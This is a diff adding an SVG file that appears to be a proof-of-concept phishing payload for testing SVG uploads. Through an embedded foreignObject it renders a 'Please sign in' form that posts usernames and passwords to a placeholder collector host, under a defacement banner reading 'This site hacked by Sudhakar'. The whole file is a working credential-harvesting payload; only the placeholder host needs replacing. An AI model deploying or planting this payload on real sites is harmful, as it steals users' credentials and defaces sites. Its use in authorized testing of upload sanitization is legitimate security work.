@@ -1,0 +1,51 @@
+<?xml version="1.0" encoding="utf-8"?>
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xhtml="http://www.w3.org/1999/xhtml"
+     width="1000" height="600" viewBox="0 0 1000 600" role="img" aria-label="PoC login form">
+  <rect width="100%" height="100%" fill="#f8fafc"/>
+
+  <!-- Header -->
+  <text x="50%" y="90" text-anchor="middle"
+        font-family="Segoe UI, Roboto, Arial" font-size="32" font-weight="700" fill="#b71c1c">
+    This site hacked by Sudhakar
+  </text>
+
+  <!-- Card background -->
+  <rect x="200" y="140" width="600" height="360" rx="12" fill="#ffffff" stroke="#e5e7eb" />
+
+  <!-- Embed real HTML form using foreignObject -->
+  <foreignObject x="220" y="170" width="560" height="300">
+    <xhtml:body xmlns="http://www.w3.org/1999/xhtml" style="margin:0;font-family:Segoe UI, Roboto, Arial, sans-serif;">
+      <div style="padding:12px;">
+        <h2 style="margin:6px 0 18px 0; font-size:20px; color:#111827;">Please sign in to continue</h2>
+
+        <form method="POST" action="https://your-collector.example/submit" autocomplete="off"
+              style="display:flex;flex-direction:column;gap:10px;">
+          <label style="font-size:12px; color:#6b7280;">
+            Username or email
+            <input name="username" type="text" autocomplete="off"
+                   style="display:block;width:100%;padding:10px;border:1px solid #d1d5db;border-radius:6px;margin-top:6px;"/>
+          </label>
+
+          <label style="font-size:12px; color:#6b7280;">
+            Password
+            <input name="password" type="password" autocomplete="off"
+                   style="display:block;width:100%;padding:10px;border:1px solid #d1d5db;border-radius:6px;margin-top:6px;"/>
+          </label>
+
+          <button type="submit"
+                  style="margin-top:10px;padding:12px;background:#1f6feb;color:#fff;border:none;border-radius:8px;font-weight:700;cursor:pointer;">
+            Sign in
+          </button>
+
+          <p style="font-size:11px;color:#9ca3af;margin-top:12px;">Proof-of-concept form — authorized testing only.</p>
+        </form>
+      </div>
+    </xhtml:body>
+  </foreignObject>
+
+  <!-- fallback note text in SVG (visible if foreignObject stripped) -->
+  <text x="50%" y="540" text-anchor="middle" font-family="Segoe UI, Roboto, Arial" font-size="12" fill="#9ca3af">
+    If the HTML form is sanitized, this file will render as a visual-only PoC.
+  </text>
+</svg>
